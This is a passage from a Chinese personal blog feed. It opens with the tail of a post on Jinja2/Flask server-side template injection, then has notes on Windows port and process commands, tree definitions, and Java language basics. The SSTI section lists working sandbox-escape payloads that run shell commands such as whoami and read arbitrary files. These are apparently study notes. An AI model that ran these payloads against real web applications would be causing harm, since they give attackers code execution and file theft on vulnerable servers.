class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">//</span>针对jinjia2<span class="token operator">/</span>flask为<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span>适用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>获取基本类后，继续向下获取基本类 object 的子类：</p><pre class="line-numbers language-python"><code class="language-python">object<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里有可能子类中就含有可以利用的函数，如file,eval等，但是一般是没有的</p><p>可以用以下模板控制语句找找看</p><p><img src="/img/image-20201222222642704.png" alt="image-20201222222642704"></p><p>找到重载过的<strong>init</strong>类（在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的）：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token operator">&lt;</span>slot wrapper <span class="token string">'__init__'</span> of <span class="token string">'object'</span> objects<span class="token operator">></span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token operator">&lt;</span>unbound method WarningMessage<span class="token punctuation">.</span>__init__<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>或者用模板控制语句找到可以利用的模块，或者<strong>builtins</strong></p><p><img src="/img/image-20201222222733823.png" alt="image-20201222222733823"></p><p>构造payload</p><pre class="line-numbers language-jinja2"><code class="language-jinja2">''.__class__.__base__.__subclasses__()[59]''.__class__.__base__.__subclasses__()[81].__init__.__globals__['__builtins__']''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')//命令执行''.__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("whoami").read()')//跟上面这句功能一模一样<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>网上查找一些payload<br><strong>文件读写</strong></p><pre class="line-numbers language-jinja2"><code class="language-jinja2">{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('在这里输文件名', 'r').read() }}{% endif %}{% endfor %}```**命令执行**```jinja2{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('在这里输命令').read()") }}{% endif %}{% endfor %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>判断环境模板方法的流程图</strong></p><p><img src="/img/image-20210324180044441.png" alt="image-20210324180044441"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows上通过命令行查看端口和进程</title>
      <link href="/2020/12/01/2020-12-01-windows-shang-shi-yong-ming-ling-xing-cha-kan-jin-cheng/"/>
      <url>/2020/12/01/2020-12-01-windows-shang-shi-yong-ming-ling-xing-cha-kan-jin-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows上通过命令行查看端口和进程"><a href="#Windows上通过命令行查看端口和进程" class="headerlink" title="Windows上通过命令行查看端口和进程"></a>Windows上通过命令行查看端口和进程</h1><pre class="line-numbers language-shell"><code class="language-shell">netstat -ano        //查看所有端口上运行的服务和它的PID<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>-a            显示所有连接和侦听端口。</p><p> -n            以数字形式显示地址和端口号。</p><p> -o            显示拥有的与每个连接关联的进程 ID。</p><pre class="line-numbers language-shell"><code class="language-shell">taskkill /pid [PID] /f /t        //通过PID强制终结进程及其子进程<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>/PID  processid        指定要终止的进程的 PID。<br>                           使用 TaskList 取得 PID。</p><p>/IM   imagename        指定要终止的进程的映像名称。通配符 ‘*’可用来<br>                       指定所有任务或映像名称。</p><p>/T                     终止指定的进程和由它启用的子进程。</p><p>/F                     指定强制终止进程。</p><pre class="line-numbers language-shell"><code class="language-shell">tasklist|findstr [PID|"imagename"]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过PID或映像名称来查看进程（可以使用其中一个来查看另一个）</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记，cmd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树和二叉树</title>
      <link href="/2020/11/24/2020-11-24-shu-he-er-cha-shu/"/>
      <url>/2020/11/24/2020-11-24-shu-he-er-cha-shu/</url>
      
        <content type="html"><![CDATA[<h1 id="树和二叉树"><a href="#树和二叉树" class="headerlink" title="树和二叉树"></a>树和二叉树</h1><p>逻辑定义：</p><p>1.有且仅有一个特殊的节点：根节点。</p><p>2.除了根节点可以分成若干组互不交集的子集，每一个子集都是一棵树。</p><p>3.根没有前驱，叶子节点没有后继。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程，数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java学习笔记知识点</title>
      <link href="/2020/11/23/2020-11-23-java-xue-xi-bi-ji-zhi-shi-dian/"/>
      <url>/2020/11/23/2020-11-23-java-xue-xi-bi-ji-zhi-shi-dian/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="java学习笔记知识点"><a href="#java学习笔记知识点" class="headerlink" title="java学习笔记知识点"></a>java学习笔记知识点</h1><ul><li>一个源文件中只能有一个 public 类</li><li>一个源文件可以有多个非 public 类</li></ul><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">a</span><span class="token punctuation">{</span> <span class="token keyword">class</span> <span class="token class-name">b</span><span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>        这样是允许的<span class="token keyword">class</span> <span class="token class-name">a</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">b</span><span class="token punctuation">{</span><span class="token punctuation">}</span>            这样是不允许的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="类型默认值"><a href="#类型默认值" class="headerlink" title="类型默认值"></a>类型默认值</h3><p> Java 各个类型的默认值：</p><table><thead><tr><th align="left"><strong>数据类型</strong></th><th><strong>默认值</strong></th></tr></thead><tbody><tr><td align="left">byte</td><td>0</td></tr><tr><td align="left">short</td><td>0</td></tr><tr><td align="left">int</td><td>0</td></tr><tr><td align="left">long</td><td>0L</td></tr><tr><td align="left">float</td><td>0.0f</td></tr><tr><td align="left">double</td><td>0.0d</td></tr><tr><td align="left">char</td><td>‘u0000’</td></tr><tr><td align="left">String (or any object)</td><td>null</td></tr><tr><td align="left">boolean</td><td>false</td></tr></tbody></table><p>Java支持的一些转义字符序列。</p><table><thead><tr><th align="left">符号</th><th align="left">字符含义</th></tr></thead><tbody><tr><td align="left">\n</td><td align="left">换行 (0x0a)</td></tr><tr><td align="left">\r</td><td align="left">回车 (0x0d)</td></tr><tr><td align="left">\f</td><td align="left">换页符(0x0c)</td></tr><tr><td align="left">\b</td><td align="left">退格 (0x08)</td></tr><tr><td align="left">\0</td><td align="left">空字符 (0x0)</td></tr><tr><td align="left">\s</td><td align="left">空格 (0x20)</td></tr><tr><td align="left">\t</td><td align="left">制表符</td></tr><tr><td align="left">"</td><td align="left">双引号</td></tr><tr><td align="left">'</td><td align="left">单引号</td></tr><tr><td align="left">\</td><td align="left">反斜杠</td></tr><tr><td align="left">\ddd</td><td align="left">八进制字符 (ddd)</td></tr><tr><td align="left">\uxxxx</td><td align="left">16进制Unicode字符 (xxxx)</td></tr></tbody></table><p>Java语言支持的变量类型有：</p><ul><li>类变量：独立于方法之外的变量，用 static 修饰。</li><li>实例变量：独立于方法之外的变量，不过没有 static 修饰。</li><li>局部变量：类的方法中的变量。</li></ul><h3 id="final-修饰符"><a href="#final-修饰符" class="headerlink" title="final 修饰符"></a>final 修饰符</h3><p><strong>final 变量（常量）：</strong></p><p>final 表示”最后的、最终的”含义，变量一旦赋值后，不能被重新赋值。被 final 修饰的实例变量必须显式指定初始值。</p><p>final 修饰符通常和 static 修饰符一起使用来创建类常量。</p><h3 id="abstract-修饰符"><a href="#abstract-修饰符" class="headerlink" title="abstract 修饰符"></a>abstract 修饰符</h3><p><strong>抽象类：</strong></p><p>抽象类不能用来实例化对象，声明抽象类的唯一目的是为了将来对该类进行扩充。</p><p>一个类不能同时被 abstract 和 final 修饰。如果一个类包含抽象方法，那么该类一定要声明为抽象类，否则将出现编译错误。</p><p>抽象类可以包含抽象方法和非抽象方法。</p><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><p>下面是Java语言支持的赋值运算符：</p><table><thead><tr><th align="left">操作符</th><th align="left">描述</th><th align="left">例子</th></tr></thead><tbody><tr><td align="left">=</td><td align="left">简单的赋值运算符，将右操作数的值赋给左侧操作数</td><td align="left">C = A + B将把A + B得到的值赋给C</td></tr><tr><td align="left">+ =</td><td align="left">加和赋值操作符，它把左操作数和右操作数相加赋值给左操作数</td><td align="left">C + = A等价于C = C + A</td></tr><tr><td align="left">- =</td><td align="left">减和赋值操作符，它把左操作数和右操作数相减赋值给左操作数</td><td align="left">C - = A等价于C = C - A</td></tr><tr><td align="left">* =</td><td align="left">乘和赋值操作符，它把左操作数和右操作数相乘赋值给左操作数</td><td align="left">C * = A等价于C = C * A</td></tr><tr><td align="left">/ =</td><td align="left">除和赋值操作符，它把左操作数和右操作数相除赋值给左操作数</td><td align="left">C / = A，C 与 A 同类型时等价于 C = C / A</td></tr><tr><td align="left">（％）=</td><td align="left">取模和赋值操作符，它把左操作数和右操作数取模后赋值给左操作数</td><td align="left">C％= A等价于C = C％A</td></tr><tr><td align="left">&lt;&lt; =</td><td align="left">左移位赋值运算符</td><td align="left">C &lt;&lt; = 2等价于C = C &lt;&lt; 2</td></tr><tr><td align="left">&gt;&gt; =</td><td align="left">右移位赋值运算符</td><td align="left">C &gt;&gt; = 2等价于C = C &gt;&gt; 2</td></tr><tr><td align="left">＆=</td><td align="left">按位与赋值运算符</td><td align="left">C＆= 2等价于C = C＆2</td></tr><tr><td align="left">^ =</td><td align="left">按位异或赋值操作符</td><td align="left">C ^ = 2等价于C = C ^ 2</td></tr><tr><td align="left">| =</td><td align="left">按位或赋值操作符</td><td align="left">C | = 2等价于C = C | 2</td></tr></tbody></table><h2 id="instanceof-运算符"><a href="#instanceof-运算符" class="headerlink" title="instanceof 运算符"></a>instanceof 运算符</h2><p>该运算符用于操作对象实例，检查该对象是否是一个特定类型（类类型或接口类型）。</p><p>instanceof运算符使用格式如下：</p><pre><code>( Object reference variable ) instanceof  (class/interface type)</code></pre><p>如果运算符左侧变量所指的对象，是操作符右侧类或接口(class/interface)的一个对象，那么结果为真。</p><p>下面是一个例子：</p><pre><code>String name = "James";boolean result = name instanceof String; // 由于 name 是 String 类型，所以返回真</code></pre><p>如果被比较的对象兼容于右侧类型,该运算符仍然返回true。</p><p>看下面的例子：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Vehicle</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Car</span> <span class="token keyword">extends</span> <span class="token class-name">Vehicle</span> <span class="token punctuation">{</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>      Vehicle a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Car</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">boolean</span> result <span class="token operator">=</span>  a <span class="token keyword">instanceof</span> <span class="token class-name">Car</span><span class="token punctuation">;</span>      System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Java-增强-for-循环"><a href="#Java-增强-for-循环" class="headerlink" title="Java 增强 for 循环"></a>Java 增强 for 循环</h2><p>Java5 引入了一种主要用于数组的增强型 for 循环。</p><p>Java 增强 for 循环语法格式如下:</p><p>for(声明语句 : 表达式) {   //代码句子 }</p><p><strong>声明语句：</strong>声明新的局部变量，该变量的类型必须和数组元素的类型匹配。其作用域限定在循环语句块，其值与此时数组元素的值相等。</p><p><strong>表达式：</strong>表达式是要访问的数组名，或者是返回值为数组的方法。</p><p><strong>实例：</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">int</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> numbers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">}</span><span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> x <span class="token operator">:</span> numbers <span class="token punctuation">)</span><span class="token punctuation">{</span>         System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span> x <span class="token punctuation">)</span><span class="token punctuation">;</span>         System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      String <span class="token punctuation">[</span><span class="token punctuation">]</span> names <span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"James"</span><span class="token punctuation">,</span> <span class="token string">"Larry"</span><span class="token punctuation">,</span> <span class="token string">"Tom"</span><span class="token punctuation">,</span> <span class="token string">"Lacy"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span> String name <span class="token operator">:</span> names <span class="token punctuation">)</span> <span class="token punctuation">{</span>         System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span> name <span class="token punctuation">)</span><span class="token punctuation">;</span>         System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="String类"><a href="#String类" class="headerlink" title="String类"></a>String类</h2><p>java的String类一般定义后不再改变（字符串），要频繁修改，使用StringBuffer 和 StringBuilder 类</p><p>java的字符数组可以直接用new String()方式转换成字符串。</p><h2 id="Java-StringBuffer-和-StringBuilder-类"><a href="#Java-StringBuffer-和-StringBuilder-类" class="headerlink" title="Java StringBuffer 和 StringBuilder 类"></a>Java StringBuffer 和 StringBuilder 类</h2><p>当对字符串进行修改的时候，需要使用 StringBuffer 和 StringBuilder 类。</p><p>和 String 类不同的是，StringBuffer 和 StringBuilder 类的对象能够被多次的修改，并且不产生新的未使用对象。</p><p>StringBuilder 类在 Java 5 中被提出，它和 StringBuffer 之间的最大不同在于 StringBuilder 的方法不是线程安全的（不能同步访问）。</p><p>由于 StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类。然而在应用程序要求线程安全的情况下，则必须使用 StringBuffer 类。</p><h2 id="JAVA的Main函数"><a href="#JAVA的Main函数" class="headerlink" title="JAVA的Main函数"></a>JAVA的Main函数</h2><h3 id="public-static-void-main-String-args"><a href="#public-static-void-main-String-args" class="headerlink" title="public static void main(String[] args)"></a>public static void main(String[] args)</h3><p>如果要调用其他类的main函数，只要像调用它的公有方法一样就行，但要记得必须带上一个String字符串参数（new []String{}）。</p><p>另，由于main函数是静态方法，所以调用时并不需要对象实例。</p><p>例：</p><p>Test.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//        int x=10;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> str<span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">:</span>str<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"这个数现在为："</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>TestTest.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestTest</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//        Test test=new Test();</span>        Test<span class="token punctuation">.</span><span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-shell"><code class="language-shell">D:\JDK\8\bin\java.exe TestTest这个数现在为：1这个数现在为：2这个数现在为：3这个数现在为：4这个数现在为：5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><h4 id="public"><a href="#public" class="headerlink" title="public"></a>public</h4><p>访问修饰符，public表示可访问权限最高。</p></li><li><h4 id="static"><a href="#static" class="headerlink" title="static"></a>static</h4><p>static关键字是重点。<br>static关键字用来修饰静态成员变量或者方法。</p><p>通俗的说，static表示其修饰的成员变量或方法不需要实例化类就可以使用。也就是说，static变量不依赖于类的任何实例，只要类被加载(加载不等于实例化)，jvm（java虚拟机）就可以直接找到他们而不需要创建关于类的任何对象。<br>static关键字前可以有修饰符进行修饰，当使用public static时，其实相当于创建了一个<strong>全局变量(方法)</strong>。<br>再来看static修饰的代码块(即为static {…}形式的)，也叫做静态代码块。概念不必多讲，静态代码块有一个非常重要的特点：</p><p><strong>随着类的加载而执行且只执行一次</strong>。<br>静态代码块可以有多个，位置可以随便放，它不在任何的方法体内，jvm加载类时会优先执行这些静态的代码块，如果static代码块有多个，jvm将按照它们在类中出现的先后顺序依次执行它们，每个代码块只会被执行一次。</p><p>那么main函数前加public static的意义是什么呢？意义就是这样的话，在当前类还未实例化的时候，可以运行main函数。</p></li><li><h4 id="void"><a href="#void" class="headerlink" title="void"></a>void</h4><p>与C系语言不同的是，java语言默认都是正常状态结束。也就是System.exit(0)，异常结束是1。所以，java的主方法没有必要存在返回值，即void。</p></li><li><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p>沿袭C系列main命名的主函数。</p></li><li><h4 id="String"><a href="#String" class="headerlink" title="String[]"></a>String[]</h4><p>使用命令行运行class文件的时候是可以附加参数的，懂得都懂，比如 Terminal&gt;java HelloWorld test  这种写法。test会作为参数传入mian方法。因为参数并不仅限一个，所以定义成数组格式。</p><p>但在IDE中运行Java程序还是必须得在main函数中加上String[] args，否则main函数无法运行。</p><p><strong>用String数组得原因：</strong><br>String作为java中最万能的包装类具有普遍性。天地万物都可以解释成String，String也可以解析成天地万物，所以用String来存放参数自然是最优选择。<br>ps.在java 1.5以后，String[]完全可以写成String…(不定项参数)，不妨试一下。</p></li><li><h4 id="args"><a href="#args" class="headerlink" title="args"></a>args</h4><p>计算机领域用来表示参数的变量名其实就那么几个，params，args算是约定俗成的了。其实完全可以叫abc，这个想怎么叫就怎么叫。</p></li></ol><h2 id="Java-流-Stream-、文件-File-和IO"><a href="#Java-流-Stream-、文件-File-和IO" class="headerlink" title="Java 流(Stream)、文件(File)和IO"></a>Java 流(Stream)、文件(File)和IO</h2><p>Java.io 包几乎包含了所有操作输入、输出需要的类。所有这些流类代表了输入源和输出目标。</p><p>Java.io 包中的流支持很多种格式，比如：基本类型、对象、本地化字符集等等。</p><p>一个流可以理解为一个数据的序列。输入流表示从一个源读取数据，输出流表示向一个目标写数据。</p><h3 id="读取控制台输入"><a href="#读取控制台输入" class="headerlink" title="读取控制台输入"></a>读取控制台输入</h3><p>Java 的控制台输入由 System.in 完成。</p><p>为了获得一个绑定到控制台的字符流，需要把 System.in 包装在一个 BufferedReader 对象中来创建一个字符流。</p><pre class="line-numbers language-java"><code class="language-java">BufferedReader br <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span>                       <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>BufferedReader</strong> 对象创建后，便可以使用 <strong>read()</strong> 方法从控制台读取一个字符，或者用 <strong>readLine()</strong> 方法读取一个字符串。</p><h3 id="控制台输出"><a href="#控制台输出" class="headerlink" title="控制台输出"></a>控制台输出</h3><p>控制台的输出由 print( ) 和 println() 完成，这些方法都由类 PrintStream 定义，System.out 是该类对象的一个引用。</p><p>PrintStream 继承了 OutputStream类，并且实现了方法 write()。这样，write() 也可以用来往控制台写操作。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//用 write() 把字符 "A" 和紧跟着的换行符输出到屏幕</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//演示 System.out.write().</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WriteDemo</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> b<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//用char也行</span>        b <span class="token operator">=</span> <span class="token string">'A'</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>write() 方法不经常使用，因为 print() 和 println() 方法用起来更为方便。</p><h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><p>下图是一个描述输入流和输出流的类层次图。</p><p><img src="/img/iostream2xx.png" alt="img"></p><h2 id="Java-异常处理"><a href="#Java-异常处理" class="headerlink" title="Java 异常处理"></a>Java 异常处理</h2><p>异常是程序中的一些错误，但并不是所有的错误都是异常，并且错误有时候是可以避免的。</p><p>比如说，你的代码少了一个分号，那么运行出来结果是提示是错误 java.lang.Error；如果你用System.out.println(11/0)，那么你是因为你用0做了除数，会抛出 java.lang.ArithmeticException 的异常。</p><p>异常发生的原因有很多，通常包含以下几大类：</p><ul><li>用户输入了非法数据。</li><li>要打开的文件不存在。</li><li>网络通信时连接中断，或者JVM内存溢出。</li></ul><p>这些异常有的是因为用户错误引起，有的是程序错误引起的，还有其它一些是因为物理错误引起的。-</p><p>要理解Java异常处理是如何工作的，你需要掌握以下三种类型的异常：</p><ul><li><strong>检查性异常：</strong>最具代表的检查性异常是用户错误或问题引起的异常，这是程序员无法预见的。例如要打开一个不存在文件时，一个异常就发生了，这些异常在编译时不能被简单地忽略。</li><li><strong>运行时异常：</strong> 运行时异常是可能被程序员避免的异常。与检查性异常相反，运行时异常可以在编译时被忽略。</li><li><strong>错误：</strong> 错误不是异常，而是脱离程序员控制的问题。错误在代码中通常被忽略。例如，当栈溢出时，一个错误就发生了，它们在编译也检查不到的。</li></ul><p>异常类有两个主要的子类：IOException 类和 RuntimeException 类。</p><p><img src="/img/12-130Q1234I6223.jpg" alt="img"></p><h3 id="捕获异常"><a href="#捕获异常" class="headerlink" title="捕获异常"></a>捕获异常</h3><p>使用 try 和 catch 关键字可以捕获异常。try/catch 代码块放在异常可能发生的地方。</p><p>try/catch代码块中的代码称为保护代码，使用 try/catch 的语法如下：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">try</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">// 程序代码</span><span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>ExceptionName e1<span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//Catch 块</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Catch 语句包含要捕获异常类型的声明。当保护代码块中发生一个异常时，try 后面的 catch 块就会被检查。</p><p>如果发生的异常包含在 catch 块中，异常会被传递到该 catch 块，这和传递一个参数到方法是一样。</p><h3 id="多重捕获块"><a href="#多重捕获块" class="headerlink" title="多重捕获块"></a>多重捕获块</h3><p>一个 try 代码块后面跟随多个 catch 代码块的情况就叫多重捕获。</p><pre class="line-numbers language-java"><code class="language-java"><span 